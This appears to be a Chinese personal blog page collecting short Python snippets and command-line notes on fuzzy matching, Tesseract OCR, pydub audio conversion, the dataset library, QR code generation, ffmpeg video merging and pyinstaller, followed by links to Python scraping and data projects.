<h3 id="字符串模糊匹配"><a href="#字符串模糊匹配" class="headerlink" title="字符串模糊匹配"></a>字符串模糊匹配</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> process</span><br><span class="line"></span><br><span class="line">courts = [<span class="string">'北京市第二中级人民法院'</span>,<span class="string">'北京市第三中级人民法院'</span>,<span class="string">'北京市石景山区人民法院'</span>]</span><br><span class="line"></span><br><span class="line">print(process.extractOne(<span class="string">'北京第三中院'</span>, courts)[<span class="number">0</span>])</span><br><span class="line">print(process.extractOne(<span class="string">'石景山区法院'</span>, courts)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">输出https:<span class="comment">//www.dust8.com/2019/04/20/fuzzywuzzy/</span></span><br><span class="line"></span><br><span class="line">北京市第三中级人民法院</span><br><span class="line">北京市石景山区人民法院</span><br></pre></td></tr></table></figure>
<h3 id="判断图片是否损坏"><a href="#判断图片是否损坏" class="headerlink" title="判断图片是否损坏"></a>判断图片是否损坏</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def is_valid_image(filename):</span><br><span class="line">    valid = True</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Image.open(filename).load()</span><br><span class="line">    except OSError:</span><br><span class="line">        valid = False</span><br><span class="line">    <span class="keyword">return</span> valid</span><br></pre></td></tr></table></figure>
<h3 id="unicode转中文"><a href="#unicode转中文" class="headerlink" title="unicode转中文"></a>unicode转中文</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str.encode(<span class="string">'utf-8'</span>).decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">https:<span class="comment">//tangx1.com/solved/</span></span><br></pre></td></tr></table></figure>
<h3 id="文字识别ocr"><a href="#文字识别ocr" class="headerlink" title="文字识别ocr"></a>文字识别ocr</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认使用eng文字库， imgName是图片的地址，result识别结果</span></span><br><span class="line">tesseract imgName result</span><br><span class="line">指定语言:</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定使用简体中文</span></span><br><span class="line">tesseract -l chi_sim imgName result</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看本地存在的语言库</span></span><br><span class="line">tesseract --list-langs</span><br><span class="line">指定多语言:</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定多语言，用+号相连</span></span><br><span class="line">tesseract -l chi_sim+eng imgName result</span><br><span class="line">通过 pip 安装支持Python 版本的 Tesseract库</span><br><span class="line"></span><br><span class="line">pip install pytesseract</span><br><span class="line">通过Python代码的简单实现</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.open(<span class="string">'/Users/admin/Desktop/test.jpg'</span>)</span><br><span class="line">text = pytesseract.image_to_string(image)</span><br><span class="line">print text</span><br><span class="line">https:<span class="comment">//zhuanlan.zhihu.com/p/31530755</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//sourceforge.net/projects/tesseract-ocr/</span></span><br><span class="line">https:<span class="comment">//github.com/tesseract-ocr/tesseract</span></span><br><span class="line">https:<span class="comment">//github.com/UB-Mannheim/tesseract/wiki </span></span><br><span class="line">https:<span class="comment">//digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w64-setup-v4.1.0-bibtag19.exe</span></span><br><span class="line">在windows可以通过exe安装包安装，下载地址可以从GitHub项目中的wiki找到。安装完成后记得将Tesseract 执行文件的目录加入到PATH中，方便后续调用。</span><br><span class="line">img = Image.open(<span class="string">"vm3.png"</span>);</span><br><span class="line">text = image_to_string(img,lang=<span class="string">'chi_sim'</span>)</span><br><span class="line">print(text)</span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000015489113</span></span><br><span class="line"></span><br><span class="line">tesseract  <span class="number">520.</span>png outfile</span><br><span class="line">Tesseract Open Source OCR Engine v4<span class="number">.1</span><span class="number">.0</span>-bibtag19 <span class="keyword">with</span> Leptonica</span><br><span class="line">git clone https:<span class="comment">//github.com/tesseract-ocr/tessdata  太慢了</span></span><br><span class="line">https:<span class="comment">//github.com/tesseract-ocr/tessdata/raw/master/chi_sim.traineddata 直接下载这个文件</span></span><br><span class="line">wget -c https:<span class="comment">//github.com/tesseract-ocr/tessdata/blob/master/chi_sim.traineddata?raw=true</span></span><br><span class="line">下载好的语言包放入到安装目录中的testdata下即可。在windows系统你还需要将testdata目录也加入环境变量。</span><br><span class="line"></span><br><span class="line">tesseract test.png outfile -l chi_sim</span><br><span class="line">Tesseract Open Source OCR Engine v4<span class="number">.1</span><span class="number">.0</span>-bibtag19 <span class="keyword">with</span> Leptonica</span><br><span class="line">英文加汉子用-l eng+chi_sim</span><br><span class="line">https:<span class="comment">//betacat.online/posts/2018-01-16/chinese-text-ocr-via-python/</span></span><br><span class="line">http:<span class="comment">//qinghua.github.io/tesseract/</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line">class Languages:</span><br><span class="line">    CHS = <span class="string">'chi_sim'</span></span><br><span class="line">    CHT = <span class="string">'chi_tra'</span></span><br><span class="line">    ENG = <span class="string">'eng'</span></span><br><span class="line"></span><br><span class="line">def img_to_str(image_path, lang=Languages.ENG):</span><br><span class="line">    <span class="keyword">return</span> pytesseract.image_to_string(Image.open(image_path), lang)</span><br><span class="line">  </span><br><span class="line">print(img_to_str(<span class="string">'image/test1.png'</span>, lang=Languages.CHS))</span><br><span class="line">print(img_to_str(<span class="string">'image/test2.png'</span>, lang=Languages.CHS))</span><br><span class="line">虽然tesseract不能直接处理PDF，但是借助ImageMagick和Ghostscript可以轻松地把PDF转换成图片文件：</span><br><span class="line"> </span><br><span class="line">brew install imagemagick</span><br><span class="line">brew install ghostscript</span><br><span class="line">convert -density <span class="number">100</span> -trim input.pdf output%<span class="number">04</span>d.jpg</span><br><span class="line">在线 https:<span class="comment">//gongpeione.github.io/quick-js-ocr/example/</span></span><br></pre></td></tr></table></figure>
<h3 id="pydub音频处理库"><a href="#pydub音频处理库" class="headerlink" title="pydub音频处理库"></a>pydub音频处理库</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydub <span class="keyword">import</span> AudioSegment</span><br><span class="line">song = AudioSegment.from_wav(<span class="string">"never_gonna_give_you_up.wav"</span>)</span><br><span class="line">song = AudioSegment.from_mp3(<span class="string">"never_gonna_give_you_up.mp3"</span>)</span><br><span class="line">ogg_version = AudioSegment.from_ogg(<span class="string">"never_gonna_give_you_up.ogg"</span>)</span><br><span class="line">flv_version = AudioSegment.from_flv(<span class="string">"never_gonna_give_you_up.flv"</span>)</span><br><span class="line">mp4_version = AudioSegment.from_file(<span class="string">"never_gonna_give_you_up.mp4"</span>, <span class="string">"mp4"</span>)</span><br><span class="line">wma_version = AudioSegment.from_file(<span class="string">"never_gonna_give_you_up.wma"</span>, <span class="string">"wma"</span>)</span><br><span class="line">aac_version = AudioSegment.from_file(<span class="string">"never_gonna_give_you_up.aiff"</span>, <span class="string">"aac"</span>)</span><br><span class="line">awesome.export(<span class="string">"mashup.mp3"</span>, format=<span class="string">"mp3"</span>)</span><br><span class="line">awesome.export(<span class="string">"mashup.mp3"</span>, format=<span class="string">"mp3"</span>, tags=&#123;<span class="string">'artist'</span>: <span class="string">'Various artists'</span>, <span class="string">'album'</span>: <span class="string">'Best of 2011'</span>, <span class="string">'comments'</span>: <span class="string">'This album is awesome!'</span>&#125;)</span><br><span class="line">awesome.export(<span class="string">"mashup.mp3"</span>, format=<span class="string">"mp3"</span>, bitrate=<span class="string">"192k"</span>)</span><br><span class="line">https:<span class="comment">//xin053.github.io/2016/11/05/pydub%E9%9F%B3%E9%A2%91%E5%A4%84%E7%90%86%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/ 将目录下的所有mp4文件和flv文件转换为mp3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> pydub <span class="keyword">import</span> AudioSegment</span><br><span class="line">video_dir = '/home/johndoe/downloaded_videos/'  # Path where the videos are located</span><br><span class="line">extension_list = (<span class="string">'*.mp4'</span>, <span class="string">'*.flv'</span>)</span><br><span class="line">os.chdir(video_dir) # change the workplace</span><br><span class="line"><span class="keyword">for</span> extension <span class="keyword">in</span> extension_list:</span><br><span class="line">    <span class="keyword">for</span> video <span class="keyword">in</span> glob.glob(extension):</span><br><span class="line">        mp3_filename = os.path.splitext(os.path.basename(video))[<span class="number">0</span>] + <span class="string">'.mp3'</span></span><br><span class="line">        AudioSegment.from_file(video).export(mp3_filename, format=<span class="string">'mp3'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="dataset简易数据库"><a href="#dataset简易数据库" class="headerlink" title="dataset简易数据库"></a>dataset简易数据库</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dataset</span><br><span class="line">db = dataset.connect(<span class="string">'sqlite:///:memory:'</span>)</span><br><span class="line">db = dataset.connect(<span class="string">'mysql://user:password@localhost/mydatabase'</span>)</span><br><span class="line"></span><br><span class="line">table = db[<span class="string">'sometable'</span>]</span><br><span class="line">table.insert(dict(name=<span class="string">'John Doe'</span>, age=<span class="number">37</span>))</span><br><span class="line">table.insert(dict(name=<span class="string">'Jane Doe'</span>, age=<span class="number">34</span>, gender=<span class="string">'female'</span>))</span><br><span class="line">john = table.find_one(name=<span class="string">'John Doe'</span>)</span><br><span class="line">OrderedDict([(<span class="string">'id'</span>, <span class="number">1</span>), (<span class="string">'name'</span>, <span class="string">'John Doe'</span>), (<span class="string">'age'</span>, <span class="number">37</span>), (<span class="string">'gender'</span>, None)])</span><br><span class="line"></span><br><span class="line">table.update(dict(name=<span class="string">'John Doe'</span>, age=<span class="number">47</span>), [<span class="string">'name'</span>])</span><br><span class="line">第二个参数相当于sql update语句中的where，用来过滤出需要更新的记录</span><br><span class="line"><span class="keyword">with</span> dataset.connect() <span class="keyword">as</span> tx:</span><br><span class="line">    tx[<span class="string">'user'</span>].insert(dict(name=<span class="string">'John Doe'</span>, age=<span class="number">46</span>, country=<span class="string">'China'</span>))</span><br><span class="line">事务操作可以简单的使用上下文管理器来实现,出现异常，将会回滚</span><br><span class="line">db = dataset.connect()</span><br><span class="line">db.begin()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    db[<span class="string">'user'</span>].insert(dict(name=<span class="string">'John Doe'</span>, age=<span class="number">46</span>, country=<span class="string">'China'</span>))</span><br><span class="line">    db.commit()</span><br><span class="line">except:</span><br><span class="line">    db.rollback()</span><br><span class="line">&gt;&gt;&gt; print(db)</span><br><span class="line">&lt;Database(sqlite:<span class="comment">///mydatabase.db)&gt;</span></span><br><span class="line">&gt;&gt;&gt; print(db.tables)</span><br><span class="line">[<span class="string">'user'</span>]</span><br><span class="line">&gt;&gt;&gt; print(db[<span class="string">'user'</span>].columns)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'country'</span>, <span class="string">'name'</span>, <span class="string">'age'</span>, <span class="string">'gender'</span>]</span><br><span class="line">&gt;&gt;&gt; print(len(db[<span class="string">'user'</span>]))</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt; table = db[<span class="string">'user'</span>]</span><br><span class="line">&gt;&gt;&gt; table</span><br><span class="line">&lt;Table(user)&gt;</span><br><span class="line">&gt;&gt;&gt; table.table</span><br><span class="line">Table(<span class="string">'user'</span>, MetaData(bind=Engine(sqlite:<span class="comment">///mydatabase.db)), Column('id', INTEGER(), table=&lt;user&gt;, primary_key=True, nullable=False), Column('country', TEXT(), table=&lt;user&gt;), Column('name', TEXT(), table=&lt;user&gt;), Column('age', INTEGER(), table=&lt;user&gt;), Column('gender', TEXT(), table=&lt;user&gt;), schema=None)</span></span><br><span class="line">    db[<span class="string">'user'</span>].distinct(<span class="string">'country'</span>)</span><br><span class="line"></span><br><span class="line">    table.delete(place=<span class="string">'Berlin'</span>)</span><br><span class="line">result = db.query(<span class="string">'SELECT country, COUNT(*) c FROM user GROUP BY country'</span>)</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">   print(row[<span class="string">'country'</span>], row[<span class="string">'c'</span>])</span><br><span class="line">   </span><br><span class="line">   result = db[<span class="string">'users'</span>].all()</span><br><span class="line">   dataset.freeze(result, format=<span class="string">'json'</span>, filename=<span class="string">'users.json'</span>)</span><br><span class="line">https:<span class="comment">//xin053.github.io/2016/11/08/dataset%E7%AE%80%E6%98%93%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8C%85%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</span></span><br></pre></td></tr></table></figure>
<h3 id="Tesseract图片文字识别"><a href="#Tesseract图片文字识别" class="headerlink" title="Tesseract图片文字识别"></a>Tesseract图片文字识别</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">brew install tesseract</span><br><span class="line">https:<span class="comment">//github.com/tesseract-ocr/tesseract/wiki</span></span><br><span class="line">tesseract paper.png paper -l chi_sim</span><br><span class="line">tesseract paper.png paper -l chi_sim -c language_model_ngram_on=<span class="number">1</span></span><br><span class="line">tesseract paper.png paper -l chi_sim tess.conf</span><br><span class="line">https:<span class="comment">//tonydeng.github.io/2016/07/28/on-the-use-of-tesseract-picture-text-recognition/</span></span><br><span class="line">	</span><br><span class="line">tesseract -h</span><br><span class="line">Usage:</span><br><span class="line">  D:\Tesseract\tesseract.exe --help | --help-extra | --version</span><br><span class="line">  D:\Tesseract\tesseract.exe --list-langs</span><br><span class="line">  D:\Tesseract\tesseract.exe imagename outputbase [options...] [configfile...]</span><br><span class="line"></span><br><span class="line">OCR options:</span><br><span class="line">  -l LANG[+LANG]        Specify language(s) used <span class="keyword">for</span> OCR.</span><br><span class="line">NOTE: These options must occur before any configfile.</span><br><span class="line"></span><br><span class="line">Single options:</span><br><span class="line">  --help                Show <span class="keyword">this</span> help message.</span><br><span class="line">  --help-extra          Show extra help <span class="keyword">for</span> advanced users.</span><br><span class="line">  --version             Show version information.</span><br><span class="line">  --list-langs          List available languages <span class="keyword">for</span> tesseract engine.</span><br><span class="line">	</span><br><span class="line">tesseract <span class="number">1.</span>jpg test -l chi_sim</span><br><span class="line">-l chi_sim表示用训练的中文数据库识别图片中的文字，不带-l默认使用英文，多个语言之间使用+连接</span><br><span class="line"></span><br><span class="line">执行上面的命令以后，会在桌面生成一个test.txt文件，文件内容就是识别的文字</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">print(pytesseract.image_to_string(Image.open(r<span class="string">"C:\Users\zzx\Desktop\1.jpg"</span>)))</span><br><span class="line">print(pytesseract.image_to_string(Image.open(r<span class="string">"C:\Users\zzx\Desktop\1.jpg"</span>), lang=<span class="string">'fra'</span>))</span><br><span class="line"></span><br><span class="line">f = open(output_file_name)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">return</span> f.read().strip()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    f.close()</span><br><span class="line">https:<span class="comment">//xin053.github.io/2016/10/28/Tesseract%E5%85%89%E5%AD%A6%E8%AF%86%E5%88%AB/</span></span><br></pre></td></tr></table></figure>
<h3 id="qrcode二维码生成库"><a href="#qrcode二维码生成库" class="headerlink" title="qrcode二维码生成库"></a>qrcode二维码生成库</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pip install qrcode</span><br><span class="line">qr <span class="string">"Some text"</span> &gt; test.png</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line">img = qrcode.make(<span class="string">'Some data here'</span>)</span><br><span class="line">img.save(r<span class="string">"C:\Users\zzx\Desktop\test.jpg"</span>)</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line">qr = qrcode.QRCode(</span><br><span class="line">    version=<span class="number">1</span>,</span><br><span class="line">    error_correction=qrcode.constants.ERROR_CORRECT_L,</span><br><span class="line">    box_size=<span class="number">10</span>,</span><br><span class="line">    border=<span class="number">4</span>,</span><br><span class="line">)</span><br><span class="line">qr.add_data(<span class="string">'Some data'</span>)</span><br><span class="line">qr.make(fit=True)</span><br><span class="line">img = qr.make_image()</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//xin053.github.io/2016/10/28/qrcode%E4%BA%8C%E7%BB%B4%E7%A0%81%E7%94%9F%E6%88%90%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</span></span><br></pre></td></tr></table></figure>
<h3 id="FFMpeg合并视频"><a href="#FFMpeg合并视频" class="headerlink" title="FFMpeg合并视频"></a>FFMpeg合并视频</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i <span class="string">"工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part1.flv"</span> -c copy -bsf:v h264_mp4toannexb -f mpegts <span class="number">1.</span>ts</span><br><span class="line">ffmpeg -i <span class="string">"工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part2.flv"</span> -c copy -bsf:v h264_mp4toannexb -f mpegts <span class="number">2.</span>ts</span><br><span class="line">ffmpeg -i <span class="string">"concat:1.ts|2.ts"</span> -c copy -bsf:a aac_adtstoasc <span class="string">"工程师的痛只有工程师能懂.mp4"</span></span><br></pre></td></tr></table></figure>
<h3 id="新闻网页正文通用抽取器"><a href="#新闻网页正文通用抽取器" class="headerlink" title="新闻网页正文通用抽取器"></a>新闻网页正文通用抽取器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 使用 pip 安装</span><br><span class="line">pip install --upgrade git+https:<span class="comment">//github.com/kingname/GeneralNewsExtractor.git</span></span><br><span class="line"></span><br><span class="line"># 使用 pipenv 安装</span><br><span class="line">pipenv install git+https:<span class="comment">//github.com/kingname/GeneralNewsExtractor.git#egg=gne</span></span><br><span class="line">使用 GNE</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> gne <span class="keyword">import</span> GeneralNewsExtractor</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; html = <span class="string">''</span><span class="string">'经过渲染的网页 HTML 代码'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; extractor = GeneralNewsExtractor()</span><br><span class="line">&gt;&gt;&gt; result = extractor.extract(html, noise_node_list=[<span class="string">'//div[@class="comment-list"]'</span>])</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"title"</span>: <span class="string">"xxxx"</span>, <span class="string">"publish_time"</span>: <span class="string">"2019-09-10 11:12:13"</span>, <span class="string">"author"</span>: <span class="string">"yyy"</span>, <span class="string">"content"</span>: <span class="string">"zzzz"</span>&#125;</span><br><span class="line">在 Chrome 浏览器中打开对应页面，然后开启开发者工具 在Elements标签页定位到&lt;html&gt;标签，并右键，选择Copy-Copy OuterHTML，如下图所示</span><br></pre></td></tr></table></figure>
<h3 id="基于Pyqt5的电影天堂电影搜索工具"><a href="#基于Pyqt5的电影天堂电影搜索工具" class="headerlink" title="基于Pyqt5的电影天堂电影搜索工具"></a>基于Pyqt5的电影天堂电影搜索工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/lt94/MovieHeavens</span></span><br><span class="line">pip3 install pyqt5</span><br><span class="line">python3 movies.py</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//mp.weixin.qq.com/s?__biz=MzA3Nzc4MzY2NA==&amp;mid=2247485581&amp;amp;idx=1&amp;amp;sn=56825bf55a43c727b594d97ccbdbaff5&amp;source=41#wechat_redirect</span></span><br><span class="line"></span><br><span class="line">Windows下</span><br><span class="line"></span><br><span class="line"># only python3 is supported</span><br><span class="line">pip install pyinstaller</span><br><span class="line"># -w 不能省略,不然会运行过程中会控制台界面</span><br><span class="line">pyinstaller -F -w ./movies.py ./movieSource/MovieHeaven.py ./movieSource/fake_user_agent.py</span><br></pre></td></tr></table></figure>
<h3 id="安装-pyinstaller-失败"><a href="#安装-pyinstaller-失败" class="headerlink" title="安装 pyinstaller 失败"></a>安装 pyinstaller 失败</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">提示失败</span><br><span class="line">pip._vendor.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host=<span class="string">'files.pythonhosted.org'</span>, port=<span class="number">443</span>): Read timed out.</span><br><span class="line"></span><br><span class="line">把命令改为 &gt; pip install pyinstaller --timeout <span class="number">1000</span></span><br><span class="line">增加 timeout 时间，运行成功。</span><br></pre></td></tr></table></figure>
<p><a href="https://xin053.github.io/2016/10/30/Python%E5%AD%A6%E4%B9%A0%E9%87%8D%E7%82%B9%E6%91%98%E8%AE%B0/" target="_blank" rel="noopener">Python学习重点摘记</a></p>
<p><a href="https://github.com/Alfred1984/interesting-python" target="_blank" rel="noopener">有趣的Python爬虫和Python数据分析小项目</a></p>
<p><a href="https://betacat.online/posts/2018-01-16/chinese-text-ocr-via-python/" target="_blank" rel="noopener">识别图片中的文字 - Tesseract 和 百度云OCR的对比</a></p>
<p><a href="https://www.dust8.com/2017/02/16/speech-to-text-use-python/" target="_blank" rel="noopener">python来语音转文字</a></p>
<p><a href="https://github.com/Lyrichu/NetCloud" target="_blank" rel="noopener">网易云音乐综合爬虫Python库</a></p>
<p><a href="https://github.com/0xHJK/Proxies" target="_blank" rel="noopener">两分钟获得数千个有效代理</a></p>
<p><a href="http://jeffyang.top/Python/%E7%88%AC%E8%99%AB/Python%E7%88%AC%E8%99%AB%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/" target="_blank" rel="noopener">Python爬虫常用工具selenium phantomjs pyquery</a></p>
<p><a href="https://github.com/xiyouMc/ncmbot" target="_blank" rel="noopener">网易云音乐助手</a></p>
<p><a href="http://jeffyang.top/Python/Python%E5%BA%93Numpy%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Python库Numpy使用入门</a></p>
<p><a href="http://jeffyang.top/Python/%E7%88%AC%E8%99%AB/Python%E7%88%AC%E8%99%AB%E5%B8%B8%E7%94%A8%E5%BA%93pyquery%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">Python爬虫常用库pyquery详解</a></p>
<p><a href="http://jeffyang.top/Python/%E7%88%AC%E8%99%AB/Python%E7%88%AC%E8%99%AB%E5%B8%B8%E7%94%A8%E5%BA%93selenium%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">Python爬虫常用库selenium详解</a></p>
<p><a href="https://anjingwd.github.io/AnJingwd.github.io/2017/09/02/python%E5%AE%9E%E7%8E%B0excel%E4%BA%8C%E7%BB%B4%E8%A1%A8%E6%A0%BC%E6%A0%BC%E5%BC%8F%E5%8C%96/" target="_blank" rel="noopener">python实现excel二维表格格式化</a></p>
<p><a href="https://mp.weixin.qq.com/s/hb8dlm3Ixsn9vcDfInqAZQ" target="_blank" rel="noopener">python pandas 这些方法解决了数据清洗80%的工作量</a></p>
<p><a href="https://github.com/Ehco1996/Python-crawler" target="_blank" rel="noopener">从头开始 系统化的 学习如何写Python爬虫</a></p>
<p><a href="https://github.com/injetlee/Python" target="_blank" rel="noopener">Python脚本。模拟登录知乎， 爬虫，操作excel，微信公众号，远程开机</a></p>
